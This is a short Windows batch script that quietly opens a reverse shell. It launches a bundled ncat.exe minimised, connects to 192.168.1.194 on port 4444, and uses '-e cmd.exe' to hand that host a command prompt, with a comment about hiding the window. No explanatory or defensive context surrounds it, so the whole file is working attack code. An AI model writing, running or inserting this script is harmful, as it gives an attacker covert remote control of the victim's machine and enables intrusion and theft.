@echo off
:: Hide the command prompt window
start /min cmd /c "%~dp0ncat.exe 192.168.1.194 4444 -e cmd.exe"
exit